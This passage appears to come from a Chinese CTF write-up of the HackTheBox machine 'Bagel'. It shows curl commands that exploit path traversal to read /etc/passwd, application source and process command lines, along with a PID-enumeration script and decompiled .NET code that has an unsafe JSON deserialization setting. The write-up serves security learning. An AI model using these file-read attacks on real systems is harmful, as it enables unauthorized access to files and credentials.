class="line">SF:x20response&lt;&#x2F;title&gt;\n\x20\x20\x20\x20&lt;&#x2F;head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;&#x2F;h1&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\</span><br><span class="line">SF:x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#39;\\x05\\x04\\x0</span><br><span class="line">SF:0\\x01\\x02\\x80\\x05\\x01\\x00\\x03&#39;\)\.&lt;&#x2F;p&gt;\n\x20\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20</span><br><span class="line">SF:-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;&#x2F;p&gt;\n\x2</span><br><span class="line">SF:0\x20\x20\x20&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-9"><a class="markdownIt-Anchor" href="#路径枚举-9"></a> 路径枚举</h3>
<p>获得域名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.201:8000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 FOUND</span><br><span class="line">Server: Werkzeug&#x2F;2.2.2 Python&#x2F;3.10.9</span><br><span class="line">Date: Sat, 25 Mar 2023 05:42:27 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 263</span><br><span class="line">Location: http:&#x2F;&#x2F;bagel.htb:8000&#x2F;?page&#x3D;index.html</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.201\tbagel.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>8000端口 Python Web服务<br />
5000端口直接400<br />
扫个锤子的路径</p>
<h2 id="漏洞利用-28"><a class="markdownIt-Anchor" href="#漏洞利用-28"></a> 漏洞利用</h2>
<p>重定向到<code>http://bagel.htb:8000/?page=index.html</code></p>
<p>LFI</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:59:59:Account used for TPM access:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-oom:x:999:999:systemd Userspace OOM Killer:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">polkitd:x:998:997:User for polkitd:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Rpcbind Daemon:&#x2F;var&#x2F;lib&#x2F;rpcbind:&#x2F;sbin&#x2F;nologin</span><br><span class="line">abrt:x:173:173::&#x2F;etc&#x2F;abrt:&#x2F;sbin&#x2F;nologin</span><br><span class="line">setroubleshoot:x:997:995:SELinux troubleshoot server:&#x2F;var&#x2F;lib&#x2F;setroubleshoot:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-ws:x:996:994:User for cockpit web service:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cockpit-wsinstance:x:995:993:User for cockpit-ws instances:&#x2F;nonexisting:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;share&#x2F;empty.sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">chrony:x:994:992::&#x2F;var&#x2F;lib&#x2F;chrony:&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:993:991:Dnsmasq DHCP and DNS server:&#x2F;var&#x2F;lib&#x2F;dnsmasq:&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:72:72::&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:989:989:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:988:988:systemd Time Synchronization:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">developer:x:1000:1000::&#x2F;home&#x2F;developer:&#x2F;bin&#x2F;bash</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:987:987::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>尝试读取WEB代码文件</p>
<p><del><a target="_blank" rel="noopener" href="http://app.py">app.py</a> or <a target="_blank" rel="noopener" href="http://index.py">index.py</a> or <a target="_blank" rel="noopener" href="http://main.py">main.py</a></del></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../app.py</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, redirect, Response</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> websocket,json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;page&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">            page = <span class="string">&#x27;static/&#x27;</span>+request.args.get(<span class="string">&#x27;page&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(page):</span><br><span class="line">                resp=send_file(page)</span><br><span class="line">                resp.direct_passthrough = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">if</span> os.path.getsize(page) == <span class="number">0</span>:</span><br><span class="line">                    resp.headers[<span class="string">&quot;Content-Length&quot;</span>]=<span class="built_in">str</span>(<span class="built_in">len</span>(resp.get_data()))</span><br><span class="line">                <span class="keyword">return</span> resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(<span class="string">&#x27;http://bagel.htb:8000/?page=index.html&#x27;</span>, code=<span class="number">302</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/orders&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span>():</span> <span class="comment"># don&#x27;t forget to run the order app first with &quot;dotnet &lt;path to .dll&gt;&quot; command. Use your ssh key to access the machine.</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ws = websocket.WebSocket()    </span><br><span class="line">        ws.connect(<span class="string">&quot;ws://127.0.0.1:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">        order = &#123;<span class="string">&quot;ReadOrder&quot;</span>:<span class="string">&quot;orders.txt&quot;</span>&#125;</span><br><span class="line">        data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">        ws.send(data)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="keyword">return</span>(json.loads(result)[<span class="string">&#x27;ReadOrder&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&quot;Unable to connect&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
<p>这里提到dll文件和SSH key</p>
<p>编写<code>cmdline.py</code>如下，用于枚举进程命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmdline.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://bagel.htb:8000/?page=../../../../proc/%d/cmdline&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">2000</span>):</span><br><span class="line">	res = req.get(url % _)</span><br><span class="line">	print(<span class="string">&quot;%s: %s&quot;</span> % (_, res.text))</span><br></pre></td></tr></table></figure>
<p>找到一个相关命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">891: dotnet&#x2F;opt&#x2F;bagel&#x2F;bin&#x2F;Debug&#x2F;net6.0&#x2F;bagel.dll</span><br></pre></td></tr></table></figure>
<p><code>/proc/$pid/cmdline</code>中<code>\x20</code>会变成<code>\x00</code></p>
<p>所以原始命令如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll</span><br></pre></td></tr></table></figure>
<p>获取bagel.dll</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll -o /tmp/bagel.dll</span><br></pre></td></tr></table></figure>
<p>官方论坛上有人提到<code>ilspycmd</code></p>
<blockquote>
<p>dotnet tool install --global ilspycmd --version 7.2.1.6856</p>
</blockquote>
<p>但是我以global安装后ilspycmd没有出现在PATH路径下<br />
懒得找了，以local方式安装吧</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dotnet new tool-manifest</span><br><span class="line">dotnet tool install ilspycmd</span><br><span class="line">dotnet tool run ilspycmd /tmp/bagel.dll</span><br></pre></td></tr></table></figure>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Versioning;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> WatsonWebsocket;</span><br><span class="line"></span><br><span class="line">[<span class="meta">assembly: CompilationRelaxations(8)</span>]</span><br><span class="line">[<span class="meta">assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)</span>]</span><br><span class="line">[<span class="meta">assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)</span>]</span><br><span class="line">[<span class="meta">assembly: TargetFramework(<span class="meta-string">&quot;.NETCoreApp,Version=v6.0&quot;</span>, FrameworkDisplayName = <span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyCompany(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyConfiguration(<span class="meta-string">&quot;Debug&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyFileVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyInformationalVersion(<span class="meta-string">&quot;1.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyProduct(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyTitle(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Microsoft.CodeAnalysis</span></span><br><span class="line">&#123;</span><br><span class="line">	[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">	[<span class="meta">Embedded</span>]</span><br><span class="line">	<span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">EmbeddedAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">System.Runtime.CompilerServices</span></span><br><span class="line">&#123;</span><br><span class="line">	[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">	[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">	[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line">	<span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span>[] NullableFlags;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			NullableFlags = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1</span>] &#123; P_0 &#125;;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span>[] P_0</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			NullableFlags = P_0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">	[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">	[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line">	<span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableContextAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span> Flag;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">NullableContextAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			Flag = P_0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">bagel_server</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Handler</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Serialize</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line">			JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">			val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line">			<span class="keyword">return</span> JsonConvert.SerializeObject(obj, (Formatting)<span class="number">1</span>, val);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Deserialize</span>(<span class="params"><span class="built_in">string</span> json</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			<span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line">			<span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">				val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line">				<span class="keyword">return</span> JsonConvert.DeserializeObject&lt;Base&gt;(json, val);</span><br><span class="line">			&#125;</span><br><span class="line">			catch</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;Message\&quot;:\&quot;unknown\&quot;&#125;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Bagel</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> _ServerIp = <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">int</span> _ServerPort = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> _Ssl = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">static</span> WatsonWsServer _Server = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>		&#123;</span><br><span class="line">			InitializeServer();</span><br><span class="line">			StartServer();</span><br><span class="line">			<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span 